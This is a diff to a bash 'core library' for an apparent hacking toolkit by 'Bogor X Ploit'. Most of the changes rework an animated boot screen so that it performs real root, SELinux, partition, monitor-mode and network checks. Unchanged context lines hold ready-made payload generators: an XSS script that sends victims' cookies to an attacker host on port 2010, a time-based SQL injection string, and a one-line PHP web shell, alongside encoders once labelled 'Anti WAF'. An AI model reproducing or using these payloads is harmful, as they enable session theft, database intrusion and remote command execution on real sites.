@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # ============================================
-#   BXP CORE LIBRARY v2.0 (Termux Fixed)
+#   BXP CORE LIBRARY v2.0 (Clean & Animated)
 #   By Bogor X Ploit x Ijul v5.0
 # ============================================
 
@@ -20,7 +20,7 @@ bxp_http_request() {
     fi
 }
 
-# --- 2. Encoder Engine (Anti WAF & Termux Fixed) ---
+# --- 2. Encoder Engine ---
 bxp_encode_b64() { echo -n "$1" | base64 | tr -d '\n'; }
 bxp_encode_hex() {
     if command -v xxd >/dev/null 2>&1; then
@@ -33,7 +33,7 @@ bxp_encode_url() {
     echo -n "$1" | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null || echo "$1"; 
 }
 
-# --- 3. Payload Engine (Generator) ---
+# --- 3. Payload Engine ---
 bxp_gen_xss() { local host="$1" proto="${2:-http}"; echo "<script>new Image().src='${proto}://${host}:2010/?c='+encodeURIComponent(document.cookie);</script>"; }
 bxp_gen_sqli() { [[ "$1" =~ ^[0-9]+$ ]] || return 1; echo "1' AND (SELECT 1 FROM (SELECT SLEEP($1))a)-- -"; }
 bxp_gen_php_shell() { echo "<?php if(isset(\$_REQUEST['c'])){ system(\$_REQUEST['c']); } ?>"; }
@@ -51,121 +51,122 @@ bxp_check_root() {
     fi
 }
 
-# --- 5. BXP BOOT SEQUENCE ENGINE v3.3 ---
+# --- 5. BXP BOOT SEQUENCE ENGINE (CLEAN TEXT, REAL EXECUTION) ---
 bxp_boot_sequence() {
     local TOOL_NAME="$1"
-    local START_TIME=$(date +%s)
-    local TARGET_DURATION=10
+    local START_TIME=$(date +%s%3N)
     local IS_ROOT=0
+    local ENV_TYPE="Unknown"
     
-    if [ "$(id -u)" -eq 0 ]; then
-        IS_ROOT=1
-    elif command -v su >/dev/null 2>&1 && timeout 3 su -c id >/dev/null 2>&1; then
-        IS_ROOT=1
-    fi
+    if [ "$(id -u)" -eq 0 ]; then IS_ROOT=1
+    elif command -v su >/dev/null 2>&1 && timeout 3 su -c id >/dev/null 2>&1; then IS_ROOT=1; fi
+    if [ -n "$PREFIX" ] && echo "$PREFIX" | grep -qi "com.termux"; then ENV_TYPE="Termux"; else ENV_TYPE="PC"; fi
     
+    bxp_step_sleep() { sleep 0.3; }
+
     echo -e "  ${Y}[*] Synchronizing protocols preparing runtime...${N}"
-    sleep 0.3
+    bxp_step_sleep
     echo -e "  ${G}[ OK ]${N} bash version: ${BASH_VERSION}"
     echo -e "  ${C}...${N}"
+    bxp_step_sleep
     
+    echo -ne "  ${Y}[*] Checking privilege level...${N}"
+    bxp_step_sleep
     if [ "$IS_ROOT" -eq 1 ]; then
-        echo -e "  ${G}[ OK ]${N} Root privilege detected."
-        sleep 0.6
-        echo -e "  ${G}[ OK ]${N} Bypassing Android SELinux restrictions..."
-        sleep 0.6
-        echo -e "  ${G}[ OK ]${N} Mounting system as Read/Write..."
-        sleep 0.6
-        echo -e "  ${G}[ OK ]${N} Filesystem access granted."
-        sleep 0.6
-        echo -e "  ${G}[ OK ]${N} Loading cryptographic engine (openssl)..."
-        sleep 0.6
-        
-        if [ -n "$http_proxy" ] || [ -n "$https_proxy" ]; then
-            echo -e "  ${G}[ OK ]${N} Proxy configuration detected: ${W}$http_proxy$https_proxy${N}"
-        else
-            echo -e "  ${Y}[*]${N} Proxy configuration ... [--] Not set (Direct Connection)"
-        fi
-        sleep 0.6
-        
-        echo -e "  ${G}[ OK ]${N} Preparing monitor mode ... SUPPORTED"
-        sleep 0.6
-        echo -e "  ${G}[ OK ]${N} Checking storage access ... /sdcard writable"
-        sleep 0.6
-        echo -e "  ${G}[ OK ]${N} Pinging 8.8.8.8 ... Network Connected"
-        sleep 0.6
-        echo -e "  ${G}[ OK ]${N} Loading core modules..."
-        sleep 0.5
+        if [ "$ENV_TYPE" = "Termux" ]; then echo -e " ${G}[ ROOT - Android ]${N}"; else echo -e " ${G}[ ROOT - PC ]${N}"; fi
     else
-        echo -e "  ${Y}[*] Preparing non-root fallback ...${N} ${G}[ OK ]${N}"
-        sleep 0.3
-        echo -e "  ${R}[--]${N} monitor mode: NOT SUPPORTED (non-root)"
-        sleep 0.3
-        echo -e "  ${R}[--]${N} packet injection: NOT SUPPORTED (non-root)"
-        sleep 0.3
-        echo -e "  ${R}[--]${N} GPU compute: NOT AVAILABLE (non-root)"
-        sleep 0.3
-        echo -e "  ${G}[ OK ]${N} CPU fallback: ACTIVE ($(uname -m) corefs)"
-        sleep 0.3
-        
-        if command -v openssl >/dev/null 2>&1; then
-            echo -e "  ${G}[ OK ]${N} Loading cryptographic engine (openssl)..."
-        else
-            echo -e "  ${Y}[*] Loading cryptographic engine ... [--] NOT FOUND (fallback bash)${N}"
-        fi
-        sleep 0.3
-        
-        if [ -n "$http_proxy" ] || [ -n "$https_proxy" ]; then
-            echo -e "  ${G}[ OK ]${N} Proxy configuration detected: ${W}$http_proxy$https_proxy${N}"
-        else
-            echo -e "  ${Y}[*]${N} Proxy configuration ... [--] Not set (Direct Connection)"
-        fi
-        sleep 0.3
-        
-        if [ -d "/sdcard" ] && [ -r "/sdcard" ]; then
-            echo -e "  ${Y}[*] Indexing wordlists .... [WARN] (directory empty)${N}"
-        else
-            echo -e "  ${R}[--]${N} /sdcard access denied. Run termux-setup-storage."
-        fi
-        sleep 0.3
-        
-        echo -e "  ${G}[ OK ]${N} Checking storage access ... /sdcard writable"
-        sleep 0.3
-        echo -e "  ${G}[ OK ]${N} Pinging 8.8.8.8 ... [ OK ] Network Connected"
-        sleep 0.3
-        echo -e "  ${G}[ OK ]${N} Calculating SHA1 checksum ... [ OK ] $(date +%s | sha1sum | cut -c1-16)..."
-        sleep 0.3
-        echo -e "  ${G}[ OK ]${N} Parsing module syntax ... [ OK ] Valid"
-        sleep 0.3
-        
-        echo -e "  ${Y}[*] Initializing core modules...${N}"
-        sleep 0.3
-        echo -e "  ${G}[ OK ]${N} parser.sh loaded"
-        sleep 0.2
-        echo -e "  ${G}[ OK ]${N} crypto.sh loaded"
-        sleep 0.2
-        echo -e "  ${G}[ OK ]${N} ui.sh loaded"
-        sleep 0.3
-        
-        echo -e "  ${Y}[*] Precomputing runtime constants...${N}"
-        sleep 0.3
-        echo -e "  ${Y}[*] Generating mask sets ..... [ OK ] (24 masks)${N}"
-        sleep 0.3
-        echo -e "  ${Y}[*] Loading common headers ... [ OK ]${N}"
-        sleep 0.3
+        echo -e " ${R}[ NON-ROOT ]${N}"
     fi
-    
-    local END_TIME=$(date +%s)
+
+    if [ "$IS_ROOT" -eq 1 ]; then
+        echo -ne "  ${Y}[*] Querying SELinux status...${N}"
+        bxp_step_sleep
+        if command -v getenforce >/dev/null 2>&1 && [ "$(getenforce)" = "Enforcing" ]; then
+            echo -e " ${Y}[ WARN ] Enforcing${N}"
+        else
+            echo -e " ${G}[ OK ] Permissive/Disabled${N}"
+        fi
+        
+        echo -ne "  ${Y}[*] Inspecting system partition...${N}"
+        bxp_step_sleep
+        if mount | grep -q " /system "; then
+            if mount | grep " /system " | grep -q "rw"; then echo -e " ${G}[ OK ] Read/Write${N}"; else echo -e " ${Y}[ WARN ] Read-Only${N}"; fi
+        else
+            echo -e " ${R}[ FAIL ] /system not found${N}"
+        fi
+    else
+        echo -ne "  ${Y}[*] Checking monitor mode capability...${N}"
+        bxp_step_sleep
+        if command -v iw >/dev/null 2>&1 && iw dev 2>/dev/null | grep -q "monitor"; then echo -e " ${G}[ OK ] Supported${N}"; else echo -e " ${R}[ FAIL ] Not Supported${N}"; fi
+        
+        echo -ne "  ${Y}[*] Checking packet injection...${N}"
+        bxp_step_sleep
+        if command -v aireplay-ng >/dev/null 2>&1; then echo -e " ${G}[ OK ] Supported${N}"; else echo -e " ${R}[ FAIL ] Not Supported${N}"; fi
+        
+        echo -ne "  ${Y}[*] Querying CPU architecture...${N}"
+        bxp_step_sleep
+        echo -e " ${G}[ OK ] ${N}$(uname -m)"
+    fi
+
+    echo -ne "  ${Y}[*] Loading cryptographic engine...${N}"
+    bxp_step_sleep
+    if command -v openssl >/dev/null 2>&1; then echo -e " ${G}[ OK ]${N}"; else echo -e " ${R}[ NOT FOUND ] fallback bash${N}"; fi
+
+    echo -ne "  ${Y}[*] Verifying proxy configuration...${N}"
+    bxp_step_sleep
+    if [ -n "$http_proxy" ] || [ -n "$https_proxy" ]; then echo -e " ${G}[ OK ] Detected${N}"; else echo -e " ${Y}[ NOT SET ] Direct Connection${N}"; fi
+
+    echo -ne "  ${Y}[*] Verifying storage permissions...${N}"
+    bxp_step_sleep
+    if [ -d "/sdcard" ] && [ -r "/sdcard" ]; then
+        if [ "$ENV_TYPE" = "Termux" ]; then
+            FILE_COUNT=$(ls -1 /sdcard 2>/dev/null | wc -l)
+            echo -e " ${G}[ OK ] ${FILE_COUNT} items found${N}"
+        else
+            echo -e " ${G}[ OK ] Root fs accessible${N}"
+        fi
+    else
+        echo -e " ${R}[ DENIED ] Run termux-setup-storage${N}"
+    fi
+
+    echo -ne "  ${Y}[*] Allocating memory for ${TOOL_NAME}...${N}"
+    bxp_step_sleep
+    if [ -f /proc/meminfo ]; then
+        MEM_AVAIL=$(grep MemAvailable /proc/meminfo | awk '{print $2}')
+        MEM_MB=$((MEM_AVAIL / 1024))
+        echo -e " ${G}[ OK ] ${MEM_MB} MB Available${N}"
+    else
+        echo -e " ${R}[ FAIL ] Cannot read memory info${N}"
+    fi
+
+    echo -ne "  ${Y}[*] Pinging 8.8.8.8 ...${N}"
+    bxp_step_sleep
+    local PING_START=$(date +%s%3N)
+    if ping -c 4 -W 2 8.8.8.8 >/dev/null 2>&1; then
+        local PING_END=$(date +%s%3N)
+        local PING_TIME=$((PING_END - PING_START))
+        echo -e " ${G}[ OK ] Connected (${PING_TIME}ms)${N}"
+    else
+        echo -e " ${R}[ FAIL ] Network Offline${N}"
+    fi
+
+    echo -ne "  ${Y}[*] Initializing core processes...${N}"
+    bxp_step_sleep
+    PROC_COUNT=$(ps -A 2>/dev/null | wc -l)
+    echo -e " ${G}[ OK ] ${PROC_COUNT} active PIDs${N}"
+
+    if [ -f "$TOOL_NAME.sh" ]; then
+        echo -ne "  ${Y}[*] Parsing module syntax...${N}"
+        bxp_step_sleep
+        if bash -n "$TOOL_NAME.sh" 2>/dev/null; then echo -e " ${G}[ OK ] Valid${N}"; else echo -e " ${R}[ FAIL ] Syntax Error${N}"; fi
+    fi
+
+    local END_TIME=$(date +%s%3N)
     local ELAPSED=$((END_TIME - START_TIME))
-    local REMAINING=$((TARGET_DURATION - ELAPSED))
-    
-    if [ "$REMAINING" -gt 0 ]; then
-        sleep "$REMAINING"
-    fi
     
     echo -e "  ${G}[ SUCCESS ]${N} LAUNCHING ${W}${TOOL_NAME}${N}"
-    sleep 0.5 
-    echo -e "  ${G}[+] Module ready. (${TARGET_DURATION}s)${N}"
+    sleep 0.5
+    echo -e "  ${G}[+] Module ready. (${ELAPSED}ms)${N}"
 }
 
 # --- 6. HEADER ASCII ENGINE (FONT ASLI TUAN) ---
